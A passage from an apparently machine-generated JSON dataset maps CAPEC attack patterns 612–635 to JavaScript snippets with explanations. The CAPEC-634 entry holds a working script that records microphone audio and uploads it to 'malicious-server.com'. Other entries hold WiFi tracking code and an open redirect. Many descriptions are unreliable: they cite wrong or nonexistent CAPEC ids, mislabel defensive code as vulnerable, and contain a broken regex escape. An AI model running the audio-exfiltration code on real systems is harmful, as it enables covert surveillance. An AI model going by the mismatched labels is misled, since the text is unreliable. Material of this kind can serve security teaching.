        "description": "This JavaScript code snippet uses the 'node-wifi' library to scan for nearby WiFi networks and logs their MAC addresses to a file named 'mac_addresses.txt'. The code embodies the main idea of the CAPEC 'WiFi MAC Address Tracking' by passively listening for WiFi messages and logging the associated MAC addresses. This can be used to track users based on their device's MAC address. The code also touches on related CWEs: it transmits sensitive information (MAC addresses) to a file (CWE-201), and the file is stored in a potentially accessible location (CWE-529)."
    },
    {
        "capec_id": "613",
        "capec_name": "WiFi SSID Tracking",
        "code_snippet": "const wifi = require('node-wifi');\n\nwifi.init({ iface: null });\n\nfunction trackSSID() {\n  wifi.scan((err, networks) => {\n    if (err) {\n      console.error(err);\n      return;\n    }\n    networks.forEach(network => {\n      if (network.ssid) {\n        console.log(`Found SSID: ${network.ssid}`);\n        // Potentially store or track the SSID\n      }\n    });\n  });\n}\n\ntrackSSID();",
        "description": "This JavaScript code snippet uses the 'node-wifi' library to scan for available WiFi networks and logs the SSIDs of the detected networks. The 'trackSSID' function initializes the WiFi module and scans for networks, printing each SSID to the console. This embodies the main idea of the CAPEC 'WiFi SSID Tracking' by passively listening for WiFi management frames and extracting SSIDs. The code demonstrates CWE-201 by potentially exposing sensitive SSID information, CWE-300 by not verifying the identity of the WiFi networks, and CWE-1290 by not ensuring the integrity of the SSID data. The code is a simplified representation of how an attacker might track users based on their WiFi SSIDs."
    },
    {
        "capec_id": "614",
        "capec_name": "Rooting SIM Cards",
        "code_snippet": "const crypto = require('crypto');\n\n// Simulate a weak DES key\nconst desKey = '12345678'; // CWE-326: Inadequate Encryption Strength\n\n// Function to simulate sending an OTA update via SMS\nfunction sendOTAUpdate(phoneNumber, message) {\n  const cipher = crypto.createCipheriv('des-ecb', desKey, null); // CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n  let encryptedMessage = cipher.update(message, 'utf8', 'hex');\n  encryptedMessage += cipher.final('hex');\n  console.log(`Sending OTA update to ${phoneNumber}: ${encryptedMessage}`);\n}\n\n// Simulate an attacker sending a malicious OTA update\nconst maliciousMessage = 'malicious code';\nconst targetPhoneNumber = '+1234567890';\nsendOTAUpdate(targetPhoneNumber, maliciousMessage);",
        "description": "This JavaScript code snippet demonstrates a simplified version of the 'Rooting SIM Cards' attack described in the CAPEC. The code uses a weak DES key (CWE-326) to encrypt a message, simulating the use of a broken or risky cryptographic algorithm (CWE-327). The `sendOTAUpdate` function represents the process of sending an over-the-air (OTA) update via SMS, which in this case, is a malicious message. The code highlights the vulnerability of using inadequate encryption strength and risky cryptographic algorithms, which can be exploited by attackers to send malicious updates to SIM cards."
    },
    {
        "capec_id": "615",
        "capec_name": "Evil Twin Wi-Fi Attack",
        "code_snippet": "const http = require('http');\nconst sensitiveData = 'user:password';\n\nhttp.createServer((req, res) => {\n  if (req.url === '/login') {\n    // CWE-319: Cleartext Transmission of Sensitive Information\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end(sensitiveData);\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080, '0.0.0.0');\n\nconsole.log('Server running at http://0.0.0.0:8080/');",
        "description": "This JavaScript code snippet creates an HTTP server that listens on all network interfaces (0.0.0.0) on port 8080. When a request is made to the '/login' endpoint, it responds with sensitive data ('user:password') in cleartext. This embodies the main idea of the Evil Twin Wi-Fi Attack (CAPEC-94) by demonstrating how sensitive information can be intercepted when transmitted in cleartext (CWE-319). The code does not verify the identity of the communication endpoints (CWE-300, CWE-923, CWE-940) and does not ensure message integrity (CWE-924), making it vulnerable to interception and modification by an adversary."
    },
    {
        "capec_id": "616",
        "capec_name": "Establish Rogue Location",
        "code_snippet": "const fs = require('fs');\nconst path = require('path');\n\nfunction loadResource(resourceName) {\n  const trustedPath = path.join(__dirname, 'trusted', resourceName);\n  const untrustedPath = path.join(__dirname, 'untrusted', resourceName);\n\n  if (fs.existsSync(untrustedPath)) {\n    console.log('Loading resource from untrusted path:', untrustedPath);\n    return fs.readFileSync(untrustedPath, 'utf8');\n  } else if (fs.existsSync(trustedPath)) {\n    console.log('Loading resource from trusted path:', trustedPath);\n    return fs.readFileSync(trustedPath, 'utf8');\n  } else {\n    throw new Error('Resource not found');\n  }\n}\n\n// Example usage\ntry {\n  const data = loadResource('example.txt');\n  console.log('Resource data:', data);\n} catch (error) {\n  console.error(error.message);\n}",
        "description": "This JavaScript code snippet demonstrates a scenario where an application attempts to load a resource (e.g., a file) from either a trusted or an untrusted path. The function `loadResource` first checks if the resource exists in the untrusted path and loads it from there if available. If not, it falls back to the trusted path. This embodies the CAPEC 'Establish Rogue Location' by allowing an adversary to place a malicious resource in the untrusted path, which the application may load without proper verification. The related CWEs are represented as follows: CWE-426 (Untrusted Search Path) is directly shown by searching for resources in an untrusted location, CWE-940 (Improper Verification of Source of a Communication Channel) is implied by not verifying the origin of the resource, and CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) could occur if sensitive data is read from the untrusted resource."
    },
    {
        "capec_id": "617",
        "capec_name": "Cellular Rogue Base Station",
        "code_snippet": "const net = require('net');\n\nconst server = net.createServer((socket) => {\n  console.log('Client connected');\n  socket.on('data', (data) => {\n    // Improper verification of source\n    console.log('Received data:', data.toString());\n    // No integrity check\n    socket.write('Message received');\n  });\n  socket.on('end', () => {\n    console.log('Client disconnected');\n  });\n});\n\nserver.listen(8080, () => {\n  console.log('Server listening on port 8080');\n});\n\n// Simulate a rogue base station\nconst rogueClient = net.createConnection({ port: 8080 }, () => {\n  console.log('Connected to server as rogue client');\n  rogueClient.write('Rogue data');\n});\n\nrogueClient.on('data', (data) => {\n  console.log('Server response:', data.toString());\n  rogueClient.end();\n});",
        "description": "This JavaScript code snippet demonstrates a simple TCP server that does not properly verify the source of incoming connections, does not ensure message integrity, and does not restrict communication to intended endpoints. The server listens on port 8080 and accepts any incoming connection, logging received data without verifying its origin or integrity. A rogue client simulates a rogue base station by connecting to the server and sending data, which the server accepts and responds to without any verification. This embodies the main idea of the 'Cellular Rogue Base Station' attack scenario, where an attacker can easily convince a targeted device to communicate with a rogue base station due to improper verification and lack of integrity checks."
    },
    {
        "capec_id": "618",
        "capec_name": "Cellular Broadcast Message Request",
        "code_snippet": "const sendBroadcastMessage = (phoneNumber, message) => {\n  // CWE-201: Insertion of Sensitive Information Into Sent Data\n  const sensitiveData = `Phone: ${phoneNumber}, Message: ${message}`;\n  // CWE-940: Improper Verification of Source of a Communication Channel\n  if (!verifySource()) {\n    console.error('Source verification failed');\n    return;\n  }\n  // CWE-924: Improper Enforcement of Message Integrity During Transmission\n  const messageWithIntegrityCheck = addIntegrityCheck(sensitiveData);\n  // CWE-927: Use of Implicit Intent for Sensitive Communication\n  const intent = new Intent('SEND_BROADCAST');\n  intent.putExtra('data', messageWithIntegrityCheck);\n  // CWE-300: Channel Accessible by Non-Endpoint\n  if (!secureChannel(intent)) {\n    console.error('Channel is not secure');\n    return;\n  }\n  // Send the broadcast message\n  sendIntent(intent);\n};\n\nconst verifySource = () => {\n  // Dummy function to simulate source verification\n  return true;\n};\n\nconst addIntegrityCheck = (data) => {\n  // Dummy function to simulate adding an integrity check\n  return `${data}|checksum`;\n};\n\nconst secureChannel = (intent) => {\n  // Dummy function to simulate securing the channel\n  return true;\n};\n\nconst sendIntent = (intent) => {\n  // Dummy function to simulate sending an intent\n  console.log('Broadcast message sent:', intent.getExtra('data'));\n};",
        "description": "This JavaScript code snippet simulates the process of sending a broadcast message to a mobile device, embodying the main idea of the CAPEC 'Cellular Broadcast Message Request'. The code includes several CWE-related vulnerabilities: \n1. CWE-201: Sensitive information (phone number and message) is included in the data being sent.\n2. CWE-940: The source of the communication channel is not properly verified.\n3. CWE-924: The integrity of the message during transmission is not adequately enforced.\n4. CWE-927: An implicit intent is used for transmitting sensitive data.\n5. CWE-300: The communication channel is not adequately secured, potentially allowing access by non-endpoints.\n\nThe code demonstrates how an attacker could exploit these weaknesses to send a broadcast message and potentially track the location of a target mobile device."
    },
    {
        "capec_id": "619",
        "capec_name": "Signal Strength Tracking",
        "code_snippet": "const sensitiveData = 'userLocation';\n\nfunction sendData(data) {\n  // CWE-201: Insertion of Sensitive Information Into Sent Data\n  const payload = { location: data, timestamp: Date.now() };\n  fetch('https://example.com/track', {\n    method: 'POST',\n    headers: {\n      'Content-Type': 'application/json'\n    },\n    body: JSON.stringify(payload)\n  }).then(response => {\n    if (!response.ok) {\n      throw new Error('Network response was not ok');\n    }\n    return response.json();\n  }).then(data => {\n    console.log('Success:', data);\n  }).catch(error => {\n    console.error('Error:', error);\n  });\n}\n\n// CWE-940: Improper Verification of Source of a Communication Channel\nfunction receiveData() {\n  fetch('https://example.com/data')\n    .then(response => response.json())\n    .then(data => {\n      if (data.source !== 'trustedSource') {\n        throw new Error('Untrusted source');\n      }\n      console.log('Received data:', data);\n    })\n    .catch(error => {\n      console.error('Error:', error);\n    });\n}\n\n// Simulate sending sensitive data\nsendData(sensitiveData);\n\n// Simulate receiving data\nreceiveData();",
        "description": "This JavaScript code snippet demonstrates a scenario where sensitive information, such as user location, is transmitted over a network without proper safeguards, embodying the main idea of the CAPEC 'Signal Strength Tracking'. The `sendData` function sends sensitive location data to a server, illustrating CWE-201 (Insertion of Sensitive Information Into Sent Data). The `receiveData` function fetches data from a server but fails to properly verify the source of the communication channel, illustrating CWE-940 (Improper Verification of Source of a Communication Channel). This code highlights vulnerabilities that could be exploited to track a user's location through signal strength monitoring."
    },
    {
        "capec_id": "620",
        "capec_name": "Drop Encryption Level",
        "code_snippet": "const crypto = require('crypto');\n\nfunction encrypt(data, algorithm) {\n  const key = 'hardcodedkey123456'; // CWE-321: Use of Hard-coded Cryptographic Key\n  const iv = crypto.randomBytes(16);\n  const cipher = crypto.createCipheriv(algorithm, key, iv);\n  let encrypted = cipher.update(data, 'utf8', 'hex');\n  encrypted += cipher.final('hex');\n  return iv.toString('hex') + ':' + encrypted;\n}\n\nfunction negotiateAlgorithm(clientPref, serverPref) {\n  // CWE-757: Selection of Less-Secure Algorithm During Negotiation\n  const commonAlgorithms = clientPref.filter(algo => serverPref.includes(algo));\n  return commonAlgorithms.length > 0 ? commonAlgorithms[commonAlgorithms.length - 1] : 'aes-128-cbc';\n}\n\nconst clientAlgorithms = ['aes-256-cbc', 'aes-192-cbc', 'aes-128-cbc'];\nconst serverAlgorithms = ['aes-128-cbc', 'des-ede3-cbc'];\nconst selectedAlgorithm = negotiateAlgorithm(clientAlgorithms, serverAlgorithms);\n\nconst sensitiveData = 'This is some sensitive data.';\nconst encryptedData = encrypt(sensitiveData, selectedAlgorithm);\nconsole.log('Encrypted Data:', encryptedData);",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker can force the encryption level to be lowered, making the encrypted data more vulnerable. The `negotiateAlgorithm` function simulates the negotiation process between a client and a server to select an encryption algorithm. Due to CWE-757, the weakest common algorithm ('aes-128-cbc') is chosen instead of the strongest available. The `encrypt` function uses a hard-coded cryptographic key (CWE-321) to encrypt the sensitive data, which is another vulnerability. The code highlights the risks associated with algorithm downgrade attacks and the use of weak encryption practices."
    },
    {
        "capec_id": "621",
        "capec_name": "Analysis of Packet Timing and Sizes",
        "code_snippet": "const net = require('net');\n\nconst client = new net.Socket();\nclient.connect(8080, '127.0.0.1', () => {\n  console.log('Connected');\n  // Transmitting sensitive information in cleartext\n  client.write('username=admin&password=secret');\n});\n\nclient.on('data', (data) => {\n  console.log('Received: ' + data);\n  // Simulate timing discrepancy based on received data\n  if (data.toString().includes('success')) {\n    setTimeout(() => client.destroy(), 100); // Short delay\n  } else {\n    setTimeout(() => client.destroy(), 500); // Longer delay\n  }\n});\n\nclient.on('close', () => {\n  console.log('Connection closed');\n});",
        "description": "This JavaScript code snippet demonstrates a TCP client that connects to a server and transmits sensitive information (username and password) in cleartext, which can be intercepted and logged by an attacker. The code also introduces a timing discrepancy based on the server's response, which can be observed by an attacker to infer whether the login was successful or not. This embodies the main idea of CAPEC-Analysis of Packet Timing and Sizes, highlighting vulnerabilities such as CWE-201 (Insertion of Sensitive Information Into Sent Data), CWE-319 (Cleartext Transmission of Sensitive Information), and CWE-208 (Observable Timing Discrepancy)."
    },
    {
        "capec_id": "622",
        "capec_name": "Electromagnetic Side-Channel Attack",
        "code_snippet": "const crypto = require('crypto');\n\nfunction encryptData(data, key) {\n  const cipher = crypto.createCipher('aes-256-cbc', key);\n  let encrypted = cipher.update(data, 'utf8', 'hex');\n  encrypted += cipher.final('hex');\n  return encrypted;\n}\n\nfunction sendData(data) {\n  const key = '12345678901234567890123456789012'; // Weak key\n  const encryptedData = encryptData(data, key);\n  console.log('Sending data:', encryptedData);\n}\n\nconst sensitiveData = 'This is a secret message';\nsendData(sensitiveData);",
        "description": "This JavaScript code snippet demonstrates a scenario where sensitive data is encrypted using a weak cryptographic key and then transmitted. The `encryptData` function uses the 'aes-256-cbc' algorithm with a hardcoded key, which is a poor practice (CWE-327: Use of a Broken or Risky Cryptographic Algorithm). The `sendData` function logs the encrypted data to the console, simulating the transmission of sensitive information (CWE-201: Insertion of Sensitive Information Into Sent Data). This setup is vulnerable to electromagnetic side-channel attacks (CAPEC-201), as an attacker could potentially monitor the electromagnetic emissions during the encryption process to derive the cryptographic key or the original data. The code also lacks proper protection against physical side channels (CWE-1300) and does not ensure the integrity of the communication channel (CWE-300)."
    },
    {
        "capec_id": "623",
        "capec_name": "Compromising Emanations Attack",
        "code_snippet": "const sensitiveData = 'user_password';\n\nfunction sendData() {\n  // Simulate sending data over a network\n  console.log('Sending data: ' + sensitiveData);\n}\n\nfunction processButtonPress() {\n  // Simulate a button press that causes an acoustic emission\n  console.log('Button pressed');\n  sendData();\n}\n\n// Simulate a button press event\nprocessButtonPress();",
        "description": "This JavaScript code snippet simulates a scenario where sensitive information (a user's password) is transmitted over a network when a button is pressed. The `sendData` function logs the sensitive data to the console, representing the transmission of data. The `processButtonPress` function simulates a button press event that triggers the `sendData` function. This setup embodies the main idea of a Compromising Emanations Attack (CAPEC-201) by demonstrating how physical actions (button press) can lead to the emission of sensitive information (acoustic emission and data transmission). The code also touches on related CWEs, such as the insertion of sensitive information into sent data (CWE-201) and improper protection of physical side channels (CWE-1300), by showing how sensitive data can be exposed through both network transmission and physical actions."
    },
    {
        "capec_id": "624",
        "capec_name": "Hardware Fault Injection",
        "code_snippet": "class Device {\n  constructor() {\n    this.voltage = 5; // Normal operating voltage\n    this.clockSpeed = 1000; // Normal clock speed in MHz\n    this.temperature = 25; // Normal operating temperature in Celsius\n  }\n\n  performOperation() {\n    if (this.voltage < 4.5 || this.voltage > 5.5) {\n      console.log('Voltage glitch detected!');\n      return 'Error: Voltage glitch';\n    }\n    if (this.clockSpeed < 950 || this.clockSpeed > 1050) {\n      console.log('Clock glitch detected!');\n      return 'Error: Clock glitch';\n    }\n    if (this.temperature < 0 || this.temperature > 85) {\n      console.log('Temperature out of range!');\n      return 'Error: Temperature out of range';\n    }\n    // Simulate cryptographic operation\n    let secretKey = 'superSecretKey';\n    console.log('Operation performed successfully with key:', secretKey);\n    return secretKey;\n  }\n}\n\n// Simulate fault injection\nlet device = new Device();\ndevice.voltage = 3; // Simulate voltage glitch\nconsole.log(device.performOperation());\n\ndevice.clockSpeed = 1100; // Simulate clock glitch\nconsole.log(device.performOperation());\n\ndevice.temperature = -10; // Simulate extreme cold\nconsole.log(device.performOperation());",
        "description": "This JavaScript code snippet represents a simplified model of a hardware device that performs cryptographic operations. The `Device` class has properties for voltage, clock speed, and temperature, which are critical parameters for its operation. The `performOperation` method checks these parameters to detect any anomalies such as voltage glitches, clock glitches, or extreme temperatures. If any of these conditions are met, an error message is logged, simulating the detection of a fault injection attack. The code then simulates fault injection by manually setting the voltage, clock speed, and temperature to values outside their normal operating ranges, demonstrating how such faults can be detected. This snippet embodies the main idea of CAPEC-1247, CAPEC-1248, CAPEC-1256, CAPEC-1319, CAPEC-1332, CAPEC-1334, CAPEC-1338, and CAPEC-1351 by showing how improper handling of these parameters can lead to vulnerabilities in hardware devices."
    },
    {
        "capec_id": "625",
        "capec_name": "Mobile Device Fault Injection",
        "code_snippet": "function performSensitiveOperation() {\n  // Simulate a cryptographic operation\n  let secretKey = 'superSecretKey';\n  let data = 'sensitiveData';\n  let encryptedData = encrypt(data, secretKey);\n  \n  // Simulate a fault injection vulnerability\n  if (isVoltageGlitchDetected() || isClockGlitchDetected() || isEMFIDetected()) {\n    console.error('Fault injection attack detected!');\n    return null;\n  }\n  \n  return encryptedData;\n}\n\nfunction encrypt(data, key) {\n  // Simple encryption simulation\n  return btoa(data + key);\n}\n\nfunction isVoltageGlitchDetected() {\n  // Placeholder for voltage glitch detection logic\n  return false;\n}\n\nfunction isClockGlitchDetected() {\n  // Placeholder for clock glitch detection logic\n  return false;\n}\n\nfunction isEMFIDetected() {\n  // Placeholder for electromagnetic fault injection detection logic\n  return false;\n}\n\n// Example usage\nlet result = performSensitiveOperation();\nif (result) {\n  console.log('Encrypted data:', result);\n} else {\n  console.log('Operation failed due to fault injection attack.');\n}",
        "description": "This JavaScript code snippet simulates a cryptographic operation that is vulnerable to fault injection attacks, such as voltage glitches, clock glitches, and electromagnetic fault injection (EM-FI). The `performSensitiveOperation` function encrypts sensitive data using a secret key. Before returning the encrypted data, it checks for fault injection attacks using placeholder functions (`isVoltageGlitchDetected`, `isClockGlitchDetected`, and `isEMFIDetected`). If any fault injection is detected, the operation is aborted, and an error message is logged. This code represents the main idea of CAPEC-1247, highlighting the importance of detecting and mitigating fault injection attacks to protect sensitive information."
    },
    {
        "capec_id": "626",
        "capec_name": "Smudge Attack",
        "code_snippet": "document.addEventListener('touchend', function(event) {\n  let touch = event.changedTouches[0];\n  let x = touch.pageX;\n  let y = touch.pageY;\n  console.log('Touch coordinates: (' + x + ', ' + y + ')');\n  // Simulate storing touch coordinates which could be used to infer patterns\n  localStorage.setItem('lastTouch', JSON.stringify({x: x, y: y}));\n});\n\n// Simulate a function that could be exploited to reveal touch patterns\nfunction revealPattern() {\n  let lastTouch = JSON.parse(localStorage.getItem('lastTouch'));\n  if (lastTouch) {\n    console.log('Last touch coordinates: (' + lastTouch.x + ', ' + lastTouch.y + ')');\n    // Potentially reveal sensitive information based on touch patterns\n  }\n}\n\n// Call the function to demonstrate potential vulnerability\nrevealPattern();",
        "description": "This JavaScript code snippet demonstrates a simplified version of a smudge attack on a touchscreen device. The 'touchend' event listener captures the coordinates of the user's touch and stores them in localStorage. The 'revealPattern' function retrieves these coordinates and logs them, simulating how an attacker could infer the user's touch pattern. This example embodies the main idea of CAPEC-460 (Smudge Attack) by showing how touch patterns can be captured and potentially exploited. The related CWEs provide additional context, such as improper protection of physical side channels (CWE-1300) and excessive attack surface (CWE-1125), highlighting the importance of securing physical interactions and minimizing exposed attack vectors."
    },
    {
        "capec_id": "627",
        "capec_name": "Counterfeit GPS Signals",
        "code_snippet": "const gpsReceiver = { receiveSignal: (signal) => { if (!verifySource(signal.source)) { console.log('Warning: Unverified GPS signal source'); return; } if (!checkMessageIntegrity(signal)) { console.log('Warning: GPS signal integrity compromised'); return; } processSignal(signal); }, }; function verifySource(source) { // Improper verification of source (CWE-940) return source === 'trustedSource'; } function checkMessageIntegrity(signal) { // Improper enforcement of message integrity (CWE-924) return signal.integrityCheck === true; } function processSignal(signal) { // Process the GPS signal console.log('Processing GPS signal:', signal); } // Simulated counterfeit GPS signal const counterfeitSignal = { source: 'maliciousSource', integrityCheck: false, data: 'fakeGPSData' }; gpsReceiver.receiveSignal(counterfeitSignal);",
        "description": "This JavaScript code snippet simulates a GPS receiver that processes incoming GPS signals. The `gpsReceiver` object has a `receiveSignal` method that takes a signal as input. The method first attempts to verify the source of the signal using the `verifySource` function, which is flawed (CWE-940) as it only checks if the source is 'trustedSource'. Next, it checks the integrity of the signal using the `checkMessageIntegrity` function, which is also flawed (CWE-924) as it only checks a boolean flag. If both checks pass, the signal is processed by the `processSignal` function. The code then simulates receiving a counterfeit GPS signal with an untrusted source and compromised integrity, demonstrating how an adversary could deceive the GPS receiver by broadcasting counterfeit signals. This embodies the main idea of the CAPEC by showing how improper verification and integrity checks can lead to the receiver being deceived."
    },
    {
        "capec_id": "628",
        "capec_name": "Carry-Off GPS Attack",
        "code_snippet": "const gpsReceiver = { currentLocation: { lat: 0, lon: 0 }, updateLocation: function(newLat, newLon) { this.currentLocation.lat = newLat; this.currentLocation.lon = newLon; } }; const spoofedSignal = { lat: 10, lon: 10, power: 1 }; function receiveGPSSignal(signal) { if (signal.power > 0.5) { gpsReceiver.updateLocation(signal.lat, signal.lon); } } setInterval(() => { spoofedSignal.power += 0.1; receiveGPSSignal(spoofedSignal); console.log(`Current Location: ${gpsReceiver.currentLocation.lat}, ${gpsReceiver.currentLocation.lon}`); }, 1000);",
        "description": "This JavaScript code snippet simulates a GPS carry-off attack. The `gpsReceiver` object represents a GPS receiver with a method to update its location. The `spoofedSignal` object represents a counterfeit GPS signal with increasing power. The `receiveGPSSignal` function updates the GPS receiver's location if the signal power is above a threshold. The `setInterval` function gradually increases the power of the spoofed signal and updates the receiver's location, demonstrating how an attacker can carry the target away from their intended destination. This code embodies the CAPEC by showing how an adversary can manipulate GPS signals to mislead the receiver. It also touches on related CWEs, such as improper verification of the source and insufficient message integrity checks."
    },
    {
        "capec_id": "629",
        "capec_name": "DEPRECATED: Unauthorized Use of Device Resources",
        "code_snippet": "const fs = require('fs');\n\nfunction handleUserInput(input) {\n  // CWE-67: Improper Handling of Windows Device Names\n  if (input.includes('CON') || input.includes('AUX')) {\n    console.log('Invalid input');\n    return;\n  }\n\n  // CWE-863: Incorrect Authorization\n  if (!isAuthorized(input)) {\n    console.log('Unauthorized access');\n    return;\n  }\n\n  // CWE-772: Missing Release of Resource after Effective Lifetime\n  let resource = acquireResource();\n  try {\n    // Process the input\n    fs.writeFileSync(input, 'data');\n  } finally {\n    releaseResource(resource);\n  }\n}\n\nfunction isAuthorized(input) {\n  // Placeholder for actual authorization logic\n  return input === 'authorizedUser';\n}\n\nfunction acquireResource() {\n  // Placeholder for resource acquisition\n  return {};\n}\n\nfunction releaseResource(resource) {\n  // Placeholder for resource release\n  console.log('Resource released');\n}\n\n// Example usage\nhandleUserInput('CON'); // Invalid input\nhandleUserInput('unauthorizedUser'); // Unauthorized access\nhandleUserInput('authorizedUser'); // Resource released",
        "description": "This JavaScript code snippet demonstrates several security weaknesses related to the deprecated CAPEC 'Unauthorized Use of Device Resources'. The function `handleUserInput` processes user input and includes checks for various vulnerabilities:\n\n1. **CWE-67: Improper Handling of Windows Device Names** - The code checks if the input contains 'CON' or 'AUX' and rejects it to prevent denial of service or information exposure.\n2. **CWE-863: Incorrect Authorization** - The code includes a placeholder authorization check to ensure that only authorized users can proceed.\n3. **CWE-772: Missing Release of Resource after Effective Lifetime** - The code acquires a resource, processes the input, and ensures the resource is released after its effective lifetime.\n\nThis snippet embodies the main idea of preventing unauthorized use of device resources by incorporating checks and proper resource management."
    },
    {
        "capec_id": "630",
        "capec_name": "TypoSquatting",
        "code_snippet": "const express = require('express');\nconst app = express();\n\napp.get('/redirect', (req, res) => {\n  const target = req.query.url;\n  if (target) {\n    res.redirect(target);\n  } else {\n    res.send('No URL provided');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server that includes an endpoint '/redirect'. The endpoint takes a URL as a query parameter and redirects the user to that URL. This code embodies the main idea of TypoSquatting by allowing an adversary to exploit user input to redirect to a potentially malicious site. The code also demonstrates CWE-601 (URL Redirection to Untrusted Site) by not validating the user-provided URL, making it easier for phishing attacks. Additionally, it touches on CWE-115 (Misinterpretation of Input) as the server blindly trusts the input without proper validation."
    },
    {
        "capec_id": "631",
        "capec_name": "SoundSquatting",
        "code_snippet": "const trustedDomain = 'trusted.com';\nconst userInputDomain = 'trvsted.com'; // SoundSquatting domain\n\nfunction redirectToDomain(domain) {\n  if (domain === trustedDomain) {\n    window.location.href = `https://${domain}`;\n  } else {\n    console.log('Untrusted domain detected!');\n  }\n}\n\n// Simulate user input\nredirectToDomain(userInputDomain);",
        "description": "This JavaScript code snippet demonstrates a potential SoundSquatting attack. The `trustedDomain` variable holds the legitimate domain name, while `userInputDomain` simulates a domain name that sounds similar but is spelled differently (a common tactic in SoundSquatting). The `redirectToDomain` function checks if the provided domain matches the trusted domain and redirects the user if it does. If the domain does not match, it logs a message indicating an untrusted domain. This example highlights the risk of using user-controlled input for redirection (CWE-601) and the importance of verifying domain names to prevent phishing attacks. The code also touches on the concept of using less trusted sources (CWE-348) by demonstrating how a slight variation in domain spelling can lead to security issues."
    },
    {
        "capec_id": "632",
        "capec_name": "Homograph Attack via Homoglyphs",
        "code_snippet": "const trustedDomain = 'example.com';\nconst userInput = 'examp1e.com'; // Homoglyph attack: '1' instead of 'l'\n\nfunction isTrustedDomain(input) {\n  const regex = new RegExp(`^${trustedDomain.replace('.', '\\.')}$`, 'i');\n  return regex.test(input);\n}\n\nif (isTrustedDomain(userInput)) {\n  console.log('Access granted to trusted domain.');\n} else {\n  console.log('Access denied. Potential homograph attack detected.');\n}",
        "description": "This JavaScript code snippet demonstrates a basic check to identify a trusted domain and prevent a homograph attack using homoglyphs. The `trustedDomain` variable holds the legitimate domain name, while `userInput` simulates a user-provided domain that contains a homoglyph ('1' instead of 'l'). The `isTrustedDomain` function uses a regular expression to match the user input against the trusted domain. The regex is anchored to ensure the entire input is checked, addressing CWE-777. If the input matches the trusted domain, access is granted; otherwise, access is denied, indicating a potential homograph attack. This snippet highlights the importance of distinguishing visually similar characters to prevent security breaches."
    },
    {
        "capec_id": "633",
        "capec_name": "Token Impersonation",
        "code_snippet": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\n// Secret key for JWT\nconst secretKey = 'supersecretkey';\n\n// Middleware to authenticate token\nfunction authenticateToken(req, res, next) {\n  const token = req.headers['authorization'];\n  if (!token) return res.sendStatus(403);\n\n  jwt.verify(token, secretKey, (err, user) => {\n    if (err) return res.sendStatus(403);\n    req.user = user;\n    next();\n  });\n}\n\n// Route to generate token (vulnerable)\napp.post('/login', (req, res) => {\n  const username = req.body.username;\n  // Weak authentication: no password check\n  const user = { name: username };\n  const token = jwt.sign(user, secretKey);\n  res.json({ token });\n});\n\n// Protected route\napp.get('/protected', authenticateToken, (req, res) => {\n  res.json({ message: 'This is protected data', user: req.user });\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet demonstrates a simple Express.js application that uses JSON Web Tokens (JWT) for authentication. The '/login' route generates a token for a user based solely on their username, without any password verification, representing weak authentication (CWE-1390). The 'authenticateToken' middleware checks for the presence of a token and verifies it, but the initial token generation is flawed, leading to potential token impersonation (CAPEC-287). This setup can allow an adversary to impersonate another user by simply knowing their username, highlighting the risks of improper authentication and weak security token mechanisms."
    },
    {
        "capec_id": "634",
        "capec_name": "Probe Audio and Video Peripherals",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\nconst { exec } = require('child_process');\n\n// CWE-267: Privilege Defined With Unsafe Actions\nexec('arecord -d 10 /tmp/audio_capture.wav', (err) => {\n  if (err) throw err;\n  console.log('Audio captured');\n\n  // CWE-319: Cleartext Transmission of Sensitive Information\n  const options = {\n    hostname: 'malicious-server.com',\n    port: 80,\n    path: '/upload',\n    method: 'POST',\n    headers: {\n      'Content-Type': 'audio/wav'\n    }\n  };\n\n  const req = http.request(options, (res) => {\n    res.on('data', (d) => {\n      process.stdout.write(d);\n    });\n  });\n\n  req.on('error', (e) => {\n    console.error(e);\n  });\n\n  // CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n  const audioStream = fs.createReadStream('/tmp/audio_capture.wav');\n  audioStream.pipe(req);\n  audioStream.on('end', () => {\n    req.end();\n  });\n});",
        "description": "This JavaScript code snippet demonstrates a malicious script that captures audio from a system's microphone and transmits it to a remote server. The script uses Node.js to execute a shell command (`arecord`) to record audio for 10 seconds and save it to a temporary file. It then sends this audio file to a remote server over HTTP in cleartext. This embodies the CAPEC of 'Probe Audio and Video Peripherals' by exploiting the system's audio functionality to capture sensitive information. The code also highlights several related CWEs: CWE-267 (Privilege Defined With Unsafe Actions) by using shell commands to perform potentially unsafe actions, CWE-319 (Cleartext Transmission of Sensitive Information) by sending the audio file in cleartext, and CWE-497 (Exposure of Sensitive System Information to an Unauthorized Control Sphere) by exposing the captured audio to an unauthorized remote server."
    },
    {
        "capec_id": "635",
        "capec_name": "Alternative Execution Due to Deceptive Filenames",
        "code_snippet": "const express = require('express');\nconst fileUpload = require('express-fileupload');\nconst path = require('path');\nconst app = express();\n\napp.use(fileUpload());\n\napp.post('/upload', (req, res) => {\n  if (!req.files || Object.keys(req.files).length === 0) {\n    return res.status(400).send('No files were uploaded.');\n  }\n\n  let uploadedFile = req.files.uploadedFile;\n  let uploadPath = path.join(__dirname, 'uploads', uploadedFile.name);\n\n  // Save the file to the server\n  uploadedFile.mv(uploadPath, (err) => {\n    if (err) return res.status(500).send(err);\n\n    // Check file extension\n    let fileExtension = path.extname(uploadedFile.name);\n    if (fileExtension === '.exe') {\n      return res.status(400).send('Executable files are not allowed.');\n    }\n\n    res.send('File uploaded!');\n  });\n});\n\napp.listen(3000, () => {\n  console.log('Server started on http://localhost:3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple file upload server. The server allows users to upload files, but it relies on the file extension to determine if the file is safe. Specifically, it checks if the uploaded file has an '.exe' extension and rejects it if so. This embodies the CAPEC idea of 'Alternative Execution Due to Deceptive Filenames' by demonstrating how an attacker could potentially bypass security checks if they can manipulate the file extension. The code also touches on related CWEs by showing how improper handling of file names and extensions can lead to security vulnerabilities."
    },
    {
        "capec_id": "636",
